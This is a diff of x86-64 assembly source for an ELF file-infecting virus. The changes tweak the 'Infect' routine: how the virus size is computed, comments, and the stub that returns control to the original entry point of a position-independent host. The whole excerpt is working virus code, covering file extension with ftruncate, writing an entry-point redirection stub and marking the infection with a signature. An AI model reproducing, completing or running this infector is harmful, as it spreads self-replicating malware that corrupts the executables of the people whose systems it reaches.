@@ -139,9 +139,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   
   ; extend filesize (ftruncate)
   xor     ebx,  ebx
-  mov     rbx,  VExitRoutine
-  mov     rax,  _start
-  sub     rbx,  rax
+  mov     ebx,  VIRUS_SIZE
 
   mov     r10,  [rsp + stat.st_size]                ; save copy :)
 
@@ -266,7 +264,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
-  mov   rcx,  VIRUS_SIZE                                ; rcx = size V-Body
+  mov   rcx,  VIRUS_SIZE                          ; rcx = size V-Body
 
   mov   rbx,  [rsp]   
   add   rbx,  [rsp + VX_CTX.qEof]
@@ -275,7 +273,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   dword   [rbx + 0],  0x000000e8  ; call $+5
   mov   word    [rbx + 4],  0x5800      ; pop rax   ; rax = RIP
   mov   word    [rbx + 6],  0x2d48
-  add   rcx,    0x5                     ; <-- prob needs adjustment lol
+  add   rcx,    0x5 
   mov   dword   [rbx + 8],  ecx         ; sub rax, vx_size + 5
   mov   word    [rbx + 12], 0x2d48
   mov   dword   [rbx + 14], r10d        ; sub rax, new_entry
@@ -285,12 +283,12 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   word    [rbx + 24], 0xe0ff      ; jmp rax
 
   ; --> GET OEP DESPITE PIE <-----------------------------------------------< 
-  ; call  $+5             ; e8 00 00 00 00    ; 
-  ; pop   rax             ; 58                ; rax = RIP
-  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; VX_SIZE + 5, known statically
-  ; sub   rax, 0x???????? ; 48 2d ?? ?? ?? ?? ; new entry (make sure to patch below so r10 += 0xc000000)
-  ; add   rax, 0x???????? ; 48 05 ?? ?? ?? ?? ; rax += VX_CTX.qOldEntry
-  ; jmp   rax             ; ff e0             ; 
+  ; e8 00 00 00 00    ; call  $+5             ; 
+  ; 58                ; pop   rax             ; rax = RIP
+  ; 48 2d ?? ?? ?? ?? ; sub   rax, 0x???????? ; VX_SIZE + 5, known statically
+  ; 48 2d ?? ?? ?? ?? ; sub   rax, 0x???????? ; new entry (make sure to patch below so r10 += 0xc000000)
+  ; 48 05 ?? ?? ?? ?? ; add   rax, 0x???????? ; rax += VX_CTX.qOldEntry
+  ; ff e0             ; jmp   rax             ; 
 
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
